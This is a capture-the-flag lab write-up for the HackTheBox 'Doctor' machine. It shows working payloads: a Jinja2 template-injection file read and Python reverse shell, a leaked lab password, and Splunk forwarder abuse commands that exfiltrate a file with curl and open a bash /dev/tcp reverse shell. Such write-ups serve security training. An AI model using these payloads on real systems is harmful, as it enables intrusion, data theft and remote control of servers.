---
title: Write-up Doctor Machine
author: ScarNGone & pcw3r
date: 2021-02-04 20:00:00 +0100
categories: [HackTheBox, Boot2Root]
tags: [LINUX, EASY, SSTI, Splunk, Jinja2, linpeas]
---

**<center>Ref°: HTB-18-Boot2Root</center>**

![Desktop View]({{"/assets/img/doctor/HTB-Badge-Doctor.png" | relative_url }})

— Doctor is a vulnerable machine through :

* Foothold : Server Side Template Injection
* Lateral movement : Credential in log file
* Prives : Abusing Splunk Forwarder

![Desktop View]({{ "/assets/img/doctor/HTB-Information-Doctor.png" | relative_url }})

## **<span style='color:#c0392b'>[1] Discovery - Figure out environment</span>**
### Network Service Scanning
***
We have the 3 following open ports : 22, 80, 8089

![Desktop View]({{ "/assets/img/doctor/HTB-Images-Doctor-nmap.png" | relative_url }})

### Website on port 80
***

```
http://10.10.10.209/
```

![Desktop View]({{ "/assets/img/doctor/HTB-Images-Doctor-website.png" | relative_url }})


### Docteur Secure Messaging on port 80
***
Other page can be resolve with doctors.htb:

```
http://doctors.htb/login?next=%2F
```

![Desktop View]({{ "/assets/img/doctor/HTB-Images-Doctor-secure-messaging.png" | relative_url }})

### Splunk Forwarder on port 8089
***

```
https://doctors.htb:8089/
```

![Desktop View]({{ "/assets/img/doctor/HTB-Images-Doctor-splunk-forwarder.png" | relative_url }})


## **<span style='color:#c0392b'>[2] Weaponization - Find exploit way</span>**
### Archive page under beta testing
***
Reference: <https://portswigger.net/web-security/server-side-template-injection>

Source page reveal page under beta testing:

![Desktop View]({{ "/assets/img/doctor/HTB-Images-Doctor-source-page.png" | relative_url }})

This page is empty:

![Desktop View]({{ "/assets/img/doctor/HTB-Images-Doctor-archive.png" | relative_url }})

But we can register new account and post anywant:

![Desktop View]({{ "/assets/img/doctor/HTB-Images-Doctor-account.png" | relative_url }})

![Desktop View]({{ "/assets/img/doctor/HTB-Images-Doctor-post.png" | relative_url }})

And this archive page are updated with our post:

![Desktop View]({{ "/assets/img/doctor/HTB-Images-Doctor-archive-test.png" | relative_url }})

We can determine the using of template language programmation in this website. 

![Desktop View]({{ "/assets/img/doctor/HTB-Images-Doctor-reveal-jinja2.png" | relative_url }})

The payload returns 7777777 and we can identify template used here: `Jinja2`

## **<span style='color:#c0392b'>[3] Foothold - Get into the target </span>**
### Server Side Template Injection with Jinja2
***
Reference: <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection>

#### Get remote file

```
.. get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() ..
```

![Desktop View]({{ "/assets/img/doctor/HTB-Images-Doctor-passwd.png" | relative_url }})

#### Gain RCE

```
..['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"IP\",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417) ..
```

![Desktop View]({{ "/assets/img/doctor/HTB-Images-Doctor-rce-1.png" | relative_url }})


## **<span style='color:#c0392b'>[4] Lateral Movement - Move through environment</span>**
### Linpeas reveal password in /var/log/backup
***

![Desktop View]({ "/assets/img/doctor/HTB-Images-Doctor-linpeas.png" | relative_url })

### su Shaun
***

```
Username: Shaun
Password: Guitar123
```

![Desktop View]({{ "/assets/img/doctor/HTB-Images-Doctor-su-shaun.png" | relative_url }})

## **<span style='color:#c0392b'>[5] Privilege Escalation - Gain higher-level permissions</span>**
### Abusing Splunk Forwarders
***
References: 
* <https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/>
* <https://github.com/cnotin/SplunkWhisperer2>

Shaun account is used like UF agent --> we can run arbitrary command on the server as root.

![Desktop View]({{ "/assets/img/doctor/HTB-Images-Doctor-agent-password.png" | relative_url }})

#### Get root flag

```terminal
$ python3 PySplunkWhisperer2_remote.py --host doctors.htb --port XXXX --username XXXX --password XXXX --payload "curl -F 'data=@/root/root.txt' http://IP:PORT" --lhost IP
```
![Desktop View]({{ "/assets/img/doctor/HTB-Images-Doctor-flag.png" | relative_url }})


#### Gain RCE

```terminal
$ python3 PySplunkWhisperer2_remote.py --host doctors.htb --port XXXX --username XXXX --password XXXX --payload "bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'" --lhost IP
```

![Desktop View]({{ "/assets/img/doctor/HTB-Images-Doctor-rce-2.png" | relative_url }})

***

# **<center>Trophy</center>**

> **I don't know how to put this but I'm kind of a big deal. People know me. I'm very important. I have many leather-bound books and my apartment smells of rich mahogany**
>
> Ron Burgundy



